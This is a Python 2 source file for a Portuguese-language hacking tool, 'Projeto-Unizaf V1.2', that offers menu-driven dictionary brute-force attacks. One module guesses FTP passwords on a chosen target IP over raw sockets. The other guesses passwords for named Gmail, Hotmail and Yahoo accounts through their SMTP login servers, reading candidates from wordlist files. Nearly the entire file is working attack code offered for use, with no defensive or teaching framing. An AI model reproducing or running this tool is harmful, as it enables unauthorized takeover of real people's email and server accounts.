# -*- coding: UTF-8 -*-
import socket
import sys
import re
import os
import smtplib
import time
import platform

while True:
	os.system("clear")
	print "Bem vindo ao Projeto-Unizaf V1.2"
	print "Feito por Zian25 | Codinome Zawien-Fox"
	print "Selecione uma opção"
	print "=========================="
	print "|   Brute-force FTP (1)  |"
	print "|   Brute-force SMTP (2) |"
	print "=========================="
 	pedido = input('Selecione um modulo: ')
 	if pedido == 1 or pedido == 2:
		os.system("clear");
		break
	else:
		os.system("clear");

if pedido == 1:
	while True:
	   print "===================="
	   print "|  FORÇA-BRUTA FTP |"
	   print "===================="
	   alvo = raw_input('Digite o ip alvo: ')
	   usuario = raw_input('Digite o Usuario: ')
	   file = open("ftpword.txt")
	   for linha in file.readlines():
		   try:
				print "Tentando com %s:%s "%(usuario,linha)
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((alvo, 21))
				s.recv(1024)
				s.send("USER "+usuario+"\r\n")
				s.recv(1024)
				s.send("PASS "+linha+"\r\n")
				resultado = s.recv(1024)
				s.send("QUIT\r\n")
	
				if re.search("230", resultado):
						print "[+] Senha encontrada: %s"%(linha)
						break
				else:
						print "[-] Sem sucesso [-]\n"
	
		   except socket.error:
			   	print "Não foi possivel conectar"
		   		print "Limpando"
		   		time.sleep(2)
		   		os.system("clear");
			   	break
		   
if pedido == 2:
	while True:
		print "Modulos SMPT"
		print "==============="
		print "|  Gmail(1)   |"
		print "|  Hotmail (2)|"
		print "|  Yahoo (3)  |"
		print "==============="
		pedido2 = input("Qual modulo deseja usar: ")
		if pedido2 == 1 or pedido2 == 2 or pedido2 == 3:
			pass
		else:
			os.system("clear")

		if pedido2 == 1:
			while True:
				os.system("clear")
				print "========================"
				print "|Força Bruta SMTP gmail|"
				print "========================"

				host = "smtp.gmail.com"
				punizaf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				punizaf.settimeout(0.1)
				codezaf = punizaf.connect_ex((host, 587))
				if codezaf == 0:
					print "Host está online!"

				s = smtplib.SMTP("smtp.gmail.com", 587)
				s.ehlo()
				s.starttls()
				usuario = raw_input ('Digite o email alvo: ')
				wordlist = open("smtpword.txt")
				for senha in wordlist:
					try:
						s.login(usuario, senha)
						print "[+] Senha Encontrada:%s " %senha
						break
					except smtplib.SMTPAuthenticationError:
						print "[-] Sem sucesso:%s " %senha
					
					except socket.error:
						print "Não foi possivel conectar"
					except KeyboardInterrupt:
						print "Saindo"
						break

		if pedido2 == 2:
			while True:
				os.system("clear")
				print "=========================="
				print "|Força Bruta SMTP Hotmail|"
				print "=========================="

				host = "smtp.live.com"
				punizaf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				punizaf.settimeout(0.1)
				codezaf = punizaf.connect_ex((host, 587))
				if codezaf == 0:
					print "Host está online!"
				else:
					print "Host está offline"

				s = smtplib.SMTP("smtp.live.com", 587)
				s.ehlo()
				s.starttls()
				usuario = raw_input ('Digite o email alvo: ')
				wordlist = open("smtpword.txt")
				for senha in wordlist:
					try:
						s.login(usuario, senha)
						print "[+] Senha Encontrada:%s " %senha
						break
					except smtplib.SMTPAuthenticationError:
						print "[-] Sem sucesso:%s " %senha
					except socket.error:
						print "Não foi possivel conectar"
					except KeyboardInterrupt:
						print "Saindo"
						break


		if pedido2 == 3:
			while True:

				print "========================="
				print "| Força Bruta SMTP Yahoo|"
				print "========================="


				host = "smtp.mail.yahoo.com"
				punizaf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				punizaf.settimeout(0.1)
				codezaf = punizaf.connect_ex((host, 587))
				if codezaf == 0:
					print "Host está online!"
				else:
					print "Host está offline"


				s = smtplib.SMTP("smtp.mail.yahoo.com", 587)
				s.ehlo()
				s.starttls()
				usuario = raw_input ('Digite o email alvo: ')
				wordlist = open("smtpword.txt")
				for senha in wordlist:
					try:
						s.login(usuario, senha)
						print "[+] Senha Encontrada:%s " %senha
						break
					except smtplib.SMTPAuthenticationError:
						print "[-] Sem sucesso:%s " %senha
					except socket.error:
						print "Não foi possivel conectar"
					except KeyboardInterrupt:
						print "Saindo"
						break


